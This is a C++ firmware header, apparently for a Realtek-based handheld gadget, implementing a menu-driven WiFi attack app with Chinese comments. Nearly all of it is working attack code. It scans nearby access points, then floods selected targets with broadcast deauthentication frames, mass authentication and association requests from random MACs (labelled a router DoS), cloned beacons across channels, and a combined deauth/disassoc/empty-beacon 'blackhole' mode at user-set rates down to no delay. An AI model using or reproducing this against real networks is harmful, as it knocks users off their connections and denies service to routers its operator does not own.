#ifndef APP_WIFI_ATTACK_H
#define APP_WIFI_ATTACK_H

#include <vector>
#include "../src/NanoUI.h"
#include "wifi_hack_core.h"
#include "wifi_hack_sniffer.h"
#include "../packet-injection.h"  
#include "../NetManager.h"

// 补充底层原厂扫描的回调函数
static rtw_result_t system_scan_handler(rtw_scan_handler_result_t *scan_result) {
    if (scan_result->scan_complete == 0) {
        rtw_scan_result_t *record = &scan_result->ap_details;
        
        // 限制数量防炸内存
        if (g_hackCtx->scanResults.size() >= 60) return RTW_SUCCESS;

        WiFiResult res;
        record->SSID.val[record->SSID.len] = 0; // 确保字符串结束
        res.ssid = String((const char*)record->SSID.val);
        
        if (res.ssid.length() == 0) res.ssid = "*HIDDEN*"; // 处理隐藏网络
        
        res.channel = record->channel;
        res.selected = false;
        memcpy(res.bssid, record->BSSID.octet, 6);
        
        // 去重逻辑：如果已经有了就不加了
        for (auto &ap : g_hackCtx->scanResults) {
            if (memcmp(ap.bssid, res.bssid, 6) == 0) return RTW_SUCCESS;
        }
        
        g_hackCtx->scanResults.push_back(res);
    }
    return RTW_SUCCESS;
}

// 补充底层的关联请求帧(Assoc Req)，专为 AP Flood 内存耗尽攻击准备
typedef struct __attribute__((packed, aligned(4))) {
    uint16_t frame_control = 0x0000; // Type/Subtype: Assoc Request
    uint16_t duration = 0;
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    const uint16_t sequence_number = 0;
    uint16_t capability = 0x0431;
    uint16_t listen_interval = 0x000A;
    const uint8_t ssid_tag = 0x00;
    uint8_t ssid_length = 0;
    uint8_t ssid[32];
} AssocReqFrameLocal;

struct CloneTarget {
    BeaconFrame bf;
    size_t bf_len;
    ProbeRespFrame prf;
    size_t prf_len;
};

struct ActiveAttackTarget {
    WiFiResult base;
    CloneTarget clones[1]; // Interfere 只需 1 个完美克隆体，在全信道广播
};

class AppWifiAttack : public Application {
private:
    enum UIState { STATE_MODE_SEL, STATE_LIVE_RADAR, STATE_MENU, STATE_EXEC };
    UIState state = STATE_MODE_SEL; 
    int scan_mode = 1; int radarIndex = 0; int radarOffset = 0; int menuIndex = 0;
    
    const char* menuItems[4] = { 
        "1. DEAUTH (Kick)", 
        "2. AP FLOOD (Router DoS)", 
        "3. INTERFERE (Multi-CH)", 
        "4. BLACKHOLE (Chaos)" 
    };
    
    uint32_t lastAttackTick = 0; uint32_t anim_frame = 0; 
    uint32_t currentAttackInterval = 1000; 
    
    int scan_channel_idx = 0; uint32_t scan_channel_timer = 0; 
    std::vector<int> targetChannels; 
    std::vector<ActiveAttackTarget> execTargets; 

    void drawMarqueeText(Canvas* canvas, int x, int y, String text, uint32_t frame) {
        int max_len = 21; 
        if ((int)text.length() <= max_len) {
            canvas->drawText(x, y, text.c_str());
        } else {
            int max_scroll = (int)text.length() - max_len;
            int tick = (frame / 5) % (max_scroll + 20); 
            int offset = 0;
            if (tick > 10) offset = tick - 10;
            if (offset > max_scroll) offset = max_scroll;
            canvas->drawText(x, y, text.substring(offset, offset + max_len).c_str());
        }
    }

    void setChannel(int ch) { g_hackCtx->currentChannel = ch; wifi_set_channel(ch); }

    void processHopping() {
        if (!g_hackCtx->isHopping) return; 

        uint32_t hopDelay = currentAttackInterval;
        if (menuIndex == 2 || menuIndex == 3) { 
            if (hopDelay < 1500) hopDelay = 1500; 
        } else {
            if (hopDelay < 200) hopDelay = 200;   
        }

        if (hal_get_ticks() - g_hackCtx->lastHopTime >= hopDelay) {
            if (!targetChannels.empty()) {
                g_hackCtx->currentChannelIndex = (g_hackCtx->currentChannelIndex + 1) % targetChannels.size();
                setChannel(targetChannels[g_hackCtx->currentChannelIndex]);
                g_hackCtx->addLog("[HOP] TARGET CH:" + String(g_hackCtx->currentChannel)); 
            }
            g_hackCtx->lastHopTime = hal_get_ticks();
            lastAttackTick = 0; 
        }
    }

    // 原厂系统级扫描（带 UI 进度条与防卡死）
    bool performSystemScan(Canvas* canvas, InputDriver* input) {
        g_hackCtx->scanResults.clear();
        
        // 必须切回正常 STA 模式调用原厂扫描
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        wifi_off(); safe_delay(50);
        wifi_on(RTW_MODE_STA); 
        safe_delay(50);

        if (wifi_scan_networks(system_scan_handler, NULL) != RTW_SUCCESS) {
            return false; 
        }

        uint32_t start_ms = hal_get_ticks();
        uint32_t scan_duration = 3500; 

        while (hal_get_ticks() - start_ms < scan_duration) {
            input->poll(); 
            
            canvas->clear();
            canvas->fillRect(0, 0, 128, 11, C_WHITE);
            canvas->drawText(2, 2, "SYSTEM SCANNING", 1, true);
            
            int progress = map(hal_get_ticks() - start_ms, 0, scan_duration, 0, 100);
            if (progress > 100) progress = 100;
            
            char buf[32];
            snprintf(buf, sizeof(buf), "Found APs: %d", g_hackCtx->scanResults.size());
            canvas->drawText(15, 25, buf);
            
            canvas->drawRect(14, 40, 100, 8, C_WHITE);
            canvas->fillRect(14, 40, progress, 8, C_WHITE);
            
            canvas->display();
            
            yield();
            safe_delay(20); 
        }

// 修复：手写排序，抛弃 std::sort，彻底避开底层 <algorithm> 冲突
        size_t n = g_hackCtx->scanResults.size();
        for (size_t i = 0; i < n; i++) {
            for (size_t j = i + 1; j < n; j++) {
                if (g_hackCtx->scanResults[j].channel < g_hackCtx->scanResults[i].channel) {
                    // 交换位置
                    WiFiResult temp = g_hackCtx->scanResults[i];
                    g_hackCtx->scanResults[i] = g_hackCtx->scanResults[j];
                    g_hackCtx->scanResults[j] = temp;
                }
            }
        }

        return true;
    }

public:
    const char* getAppName() override { return "WIFI_ATTACK"; }
    AppMode getMode() override { return APP_MODE_EXCLUSIVE; } 

    void runExclusive(Canvas* canvas, InputDriver* input) override {
        if (!g_hackCtx) g_hackCtx = new WifiHackContext();
        bool running = true; state = STATE_MODE_SEL; char buf[32]; uint32_t last_ui_draw = 0;

        while(running && is_display_active) {
            UIEvent e = input->poll();

            if (e.type == EVT_BACK) {
                if (state == STATE_EXEC || state == STATE_MENU) { targetChannels.clear(); execTargets.clear(); state = STATE_LIVE_RADAR; } 
                else if (state == STATE_LIVE_RADAR) { wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); wifi_off(); safe_delay(50); wifi_on(RTW_MODE_STA); state = STATE_MODE_SEL; } 
                else running = false;
            }

            if (state == STATE_MODE_SEL) {
                if (e.type == EVT_DOWN || e.type == EVT_UP) scan_mode = 1 - scan_mode;
                if (e.type == EVT_OK) {
                    
                    if (scan_mode == 1) {
                        // 启用原厂非阻塞扫描
                        performSystemScan(canvas, input);
                        
                        // 扫描完后切回 PROMISC，为后续火力全开做准备
                        wifi_off(); safe_delay(50);
                        wifi_on(RTW_MODE_PROMISC); safe_delay(50);
                        wifi_enter_promisc_mode();
                        g_hackCtx->currentMode = SNIFF_ALL; 
                        wifi_set_promisc(RTW_PROMISC_ENABLE_2, master_promisc_callback, 1);
                    } else {
                        // PASSIVE 模式：保持原有的雷达被动探查逻辑
                        wifi_off(); safe_delay(50); wifi_on(RTW_MODE_PROMISC); safe_delay(50); wifi_enter_promisc_mode();
                        g_hackCtx->reset(); g_hackCtx->currentMode = SNIFF_ALL; wifi_set_promisc(RTW_PROMISC_ENABLE_2, master_promisc_callback, 1);
                        scan_channel_idx = 0; setChannel(DEEP_SCAN_CHANNELS[0]); safe_delay(10);
                        scan_channel_timer = hal_get_ticks(); 
                    }

                    targetChannels.clear(); g_hackCtx->isHopping = false; radarIndex = 0; radarOffset = 0; state = STATE_LIVE_RADAR;
                }
            }
            else if (state == STATE_LIVE_RADAR) {
                // 如果是纯被动雷达模式，继续保留它的跳频逻辑
                if (scan_mode == 0) {
                    if (hal_get_ticks() - scan_channel_timer > 200) { 
                        scan_channel_idx = (scan_channel_idx + 1) % NUM_DEEP_CHANNELS; 
                        setChannel(DEEP_SCAN_CHANNELS[scan_channel_idx]); 
                        scan_channel_timer = hal_get_ticks(); 
                    }
                }
                
                if (e.type == EVT_DOWN) { if ((size_t)radarIndex < g_hackCtx->scanResults.size()) radarIndex++; if (radarIndex >= radarOffset + 4) radarOffset = radarIndex - 3; }
                if (e.type == EVT_UP) { if (radarIndex > 0) radarIndex--; if (radarIndex < radarOffset) radarOffset = radarIndex; }
                if (e.type == EVT_OK) { if (radarIndex == 0) state = STATE_MENU; else g_hackCtx->scanResults[radarIndex - 1].selected = !g_hackCtx->scanResults[radarIndex - 1].selected; }
            } 
            else if (state == STATE_MENU) {
                if (e.type == EVT_DOWN) { if (menuIndex < 3) menuIndex++; } 
                if (e.type == EVT_UP) { if (menuIndex > 0) menuIndex--; }
                if (e.type == EVT_OK) {
                    targetChannels.clear();
                    execTargets.clear();

                    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

                    for (size_t i = 0; i < g_hackCtx->scanResults.size(); i++) { 
                        if (g_hackCtx->scanResults[i].selected || targetChannels.empty()) { 
                            if(g_hackCtx->scanResults[i].selected && menuIndex != 2) {
                                bool exists = false;
                                for (size_t c = 0; c < targetChannels.size(); c++) {
                                    if (targetChannels[c] == g_hackCtx->scanResults[i].channel) { exists = true; break; }
                                }
                                if (!exists) targetChannels.push_back(g_hackCtx->scanResults[i].channel);
                            } 
                            
                            ActiveAttackTarget at;
                            at.base = g_hackCtx->scanResults[i];
                            
                            at.clones[0].bf_len = wifi_build_beacon_frame(at.base.bssid, broadcastMac, at.base.ssid.c_str(), at.clones[0].bf);
                            at.clones[0].prf_len = wifi_build_probe_resp_frame(at.base.bssid, broadcastMac, at.base.ssid.c_str(), at.clones[0].prf);
                            
                            execTargets.push_back(at);
                        } 
                    }

                    if (menuIndex == 2 || targetChannels.empty()) {
                        targetChannels.clear();
                        for(int i=0; i<NUM_DEEP_CHANNELS; i++) targetChannels.push_back(DEEP_SCAN_CHANNELS[i]);
                    }

                    g_hackCtx->txCount = 0; g_hackCtx->rxCount = 0; g_hackCtx->intelLogs.clear();
                    g_hackCtx->isHopping = (targetChannels.size() > 1); 
                    if (!targetChannels.empty()) setChannel(targetChannels[0]);
                    
                    g_hackCtx->addLog("ARMING WEAPONS...");
                    g_hackCtx->currentMode = SNIFF_DEAUTH; 
                    lastAttackTick = hal_get_ticks(); state = STATE_EXEC;
                }
            }
            else if (state == STATE_EXEC) {
                if (e.type == EVT_UP) {
                    if (currentAttackInterval > 500) currentAttackInterval -= 100;
                    else if (currentAttackInterval > 100) currentAttackInterval -= 50;
                    else if (currentAttackInterval > 0) currentAttackInterval -= 10;
                }
                if (e.type == EVT_DOWN) {
                    if (currentAttackInterval < 100) currentAttackInterval += 10;
                    else if (currentAttackInterval < 500) currentAttackInterval += 50;
                    else if (currentAttackInterval < 5000) currentAttackInterval += 100;
                }

                processHopping();

                uint32_t effectiveInterval = currentAttackInterval;
                if (effectiveInterval > 0 && effectiveInterval < 5) effectiveInterval = 5; 

                if (currentAttackInterval == 0 || (hal_get_ticks() - lastAttackTick >= effectiveInterval)) {
                    
                    int burstCountDeauth = (currentAttackInterval == 0) ? 30 : 3; 
                    int burstCountFlood = (currentAttackInterval == 0) ? 50 : 5; 
                    int burstCountBeacon = (currentAttackInterval == 0) ? 15 : 2; 
                    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

                    for (size_t i = 0; i < execTargets.size(); i++) {
                        if (menuIndex == 2 || execTargets[i].base.channel == g_hackCtx->currentChannel) {
                            
                            if (menuIndex == 0) { 
                                wifi_tx_broadcast_deauth(execTargets[i].base.bssid, 0x02, burstCountDeauth, 0); 
                                g_hackCtx->txCount += burstCountDeauth; 
                            }
                            else if (menuIndex == 1) { 
                                AuthReqFrame auth;
                                memcpy(auth.destination, execTargets[i].base.bssid, 6);
                                memcpy(auth.bssid, execTargets[i].base.bssid, 6);
                                
                                AssocReqFrameLocal assoc;
                                memcpy(assoc.destination, execTargets[i].base.bssid, 6);
                                memcpy(assoc.bssid, execTargets[i].base.bssid, 6);
                                assoc.ssid_length = 0;
                                const char* t_ssid = execTargets[i].base.ssid.c_str();
                                for(int s=0; t_ssid[s] != '\0' && s < 32; s++) { assoc.ssid[s] = t_ssid[s]; assoc.ssid_length++; }
                                size_t assoc_len = sizeof(AssocReqFrameLocal) - (32 - assoc.ssid_length);

                                for(int b=0; b < burstCountFlood; b++) {
                                    uint8_t randMac[6];
                                    for(int m=0; m<6; m++) randMac[m] = random(256);
                                    randMac[0] = (randMac[0] & 0xFE) | 0x02; 

                                    memcpy(auth.source, randMac, 6);
                                    memcpy(assoc.source, randMac, 6);

                                    wifi_tx_raw_frame(&auth, sizeof(AuthReqFrame));
                                    wifi_tx_raw_frame(&assoc, assoc_len);
                                }
                                g_hackCtx->txCount += (burstCountFlood * 2); 
                            }
                            else if (menuIndex == 2) { 
                                for(int b=0; b < burstCountBeacon; b++) {
                                    wifi_tx_raw_frame(&execTargets[i].clones[0].bf, execTargets[i].clones[0].bf_len);
                                    wifi_tx_raw_frame(&execTargets[i].clones[0].prf, execTargets[i].clones[0].prf_len);
                                }
                                g_hackCtx->txCount += (burstCountBeacon * 2);
                            }
                            else if (menuIndex == 3) { 
                                wifi_tx_broadcast_deauth(execTargets[i].base.bssid, 1, burstCountDeauth / 2, 0); 
                                wifi_tx_broadcast_disassoc(execTargets[i].base.bssid, 8); 
                                BeaconFrame empty_bf;
                                size_t elen = wifi_build_beacon_frame(execTargets[i].base.bssid, broadcastMac, "", empty_bf);
                                for(int b=0; b < burstCountBeacon; b++) {
                                    wifi_tx_raw_frame(&empty_bf, elen);
                                }
                                g_hackCtx->txCount += (burstCountDeauth + burstCountBeacon); 
                            }
                        }
                    }
                    lastAttackTick = hal_get_ticks();
                }
            }

            if (hal_get_ticks() - last_ui_draw > 50) { 
                last_ui_draw = hal_get_ticks(); anim_frame++; canvas->clear();
                
                if (state == STATE_MODE_SEL) { 
                    canvas->fillRect(0, 0, 128, 11, C_WHITE); canvas->drawText(2, 2, "ATTACK RADAR", 1, true); 
                    if (scan_mode == 0) { canvas->fillRect(0, 24, 128, 11, C_WHITE); canvas->drawText(6, 25, "1. PASSIVE (Stealth)", 1, true); canvas->drawText(6, 38, "2. ACTIVE  (System)", 1, false); } 
                    else { canvas->drawText(6, 25, "1. PASSIVE (Stealth)", 1, false); canvas->fillRect(0, 37, 128, 11, C_WHITE); canvas->drawText(6, 38, "2. ACTIVE  (System)", 1, true); }
                    canvas->drawLine(0, 53, 128, 53, C_WHITE); canvas->drawText(4, 55, "Press OK to Start", 1, false);
                }
                else if (state == STATE_LIVE_RADAR) {
                    canvas->fillRect(0, 0, 128, 10, C_WHITE); snprintf(buf, sizeof(buf), "CH:%03d | APs:%d", g_hackCtx->currentChannel, (int)g_hackCtx->scanResults.size()); canvas->drawText(2, 1, buf, 1, true);
                    for (int i = 0; i < 4; i++) {
                        int dataIdx = radarOffset + i; if ((size_t)dataIdx > g_hackCtx->scanResults.size()) break; int y = 14 + (i * 12);
                        if (dataIdx == 0) {
                            if (radarIndex == 0) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(10, y, "[ START EXEC ]", 1, true); } 
                            else canvas->drawText(10, y, "[ START EXEC ]", 1, false);
                        } else {
                            WiFiResult &res = g_hackCtx->scanResults[dataIdx - 1]; String msg = String(res.selected ? "[X] " : "[ ] ") + res.ssid.substring(0, 10);
                            if (radarIndex == dataIdx) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(2, y, msg.c_str(), 1, true); } 
                            else canvas->drawText(2, y, msg.c_str(), 1, false);
                            snprintf(buf, sizeof(buf), "%d", res.channel); canvas->drawText(105, y, buf, 1, radarIndex == dataIdx);
                        }
                    }
                    if (g_hackCtx->scanResults.size() > 3) { int barY = map(radarIndex, 0, g_hackCtx->scanResults.size(), 14, 54); canvas->drawLine(126, 14, 126, 56, C_WHITE); canvas->fillRect(125, barY, 3, 3, C_WHITE); }
                }
                else if (state == STATE_MENU) {
                    canvas->fillRect(0, 0, 128, 10, C_WHITE); canvas->drawText(2, 1, "SELECT PAYLOAD", 1, true);
                    for (int i = 0; i < 4; i++) { 
                        int y = 14 + (i * 12); 
                        if (menuIndex == i) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(6, y, menuItems[i], 1, true); } 
                        else canvas->drawText(6, y, menuItems[i], 1, false);
                    }
                    canvas->drawLine(125, 14, 125, 61, C_WHITE); canvas->fillRect(124, 14 + (menuIndex * 47 / 3), 3, 10, C_WHITE);
                }
                else if (state == STATE_EXEC) {
                    canvas->fillRect(0, 0, 128, 11, C_WHITE); 
                    canvas->drawText(2, 2, String(menuItems[menuIndex]).substring(3).c_str(), 1, true);

                    String tgtStr = targetChannels.empty() ? "ALL MAP" : (g_hackCtx->isHopping ? "HOPPING" : ("CH " + String(g_hackCtx->currentChannel)));
                    canvas->drawText(2, 16, ("TGT: " + tgtStr).c_str());

                    if ((anim_frame % 6) < 3) canvas->drawText(100, 16, "[*]");
                    else canvas->drawText(100, 16, "[ ]");

                    canvas->drawLine(0, 29, 128, 29, C_WHITE);
                    snprintf(buf, sizeof(buf), "TX PKTS: %lu", (unsigned long)g_hackCtx->txCount); 
                    canvas->drawText(2, 34, buf);

                    canvas->drawLine(0, 48, 128, 48, C_WHITE);
                    if (currentAttackInterval == 0) {
                        snprintf(buf, sizeof(buf), "< BACK  [U/D] MAX_SPD"); 
                    } else {
                        snprintf(buf, sizeof(buf), "< BACK  [U/D] %lums", (unsigned long)currentAttackInterval); 
                    }
                    canvas->drawText(2, 53, buf);
                }
                canvas->display(); 
            }
            
            if (state == STATE_EXEC && currentAttackInterval == 0) {
                yield(); 
            } else {
                yield(); safe_delay(1); 
            }
        }
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); wifi_off(); safe_delay(50); wifi_on(RTW_MODE_STA); 
    }
};

#endif